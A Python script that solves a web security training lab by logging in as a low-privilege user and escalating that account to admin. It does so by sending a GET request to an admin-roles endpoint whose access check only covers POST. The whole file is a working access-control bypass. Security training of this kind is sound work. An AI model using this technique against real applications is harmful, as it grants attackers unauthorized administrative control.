###########################################################################
#
# Lab: Method-based access control can be circumvented
#
# Hack Steps: 
#      1. Login as wiener
#      2. Upgrade wiener to be an admin via GET method instead of POST
#
###########################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5c00370304bb7e830046b300a80072.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Logging in as wiener.. ", end="", flush=True)
    
    data = { "username": "wiener", "password": "peter" }
    login_as_wiener = post_data("/login", data)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Upgrading wiener to be an admin via GET method instead of POST.. ", end="", flush=True)
    
    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    fetch("/admin-roles?username=wiener&action=upgrade", cookies=cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
        

def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
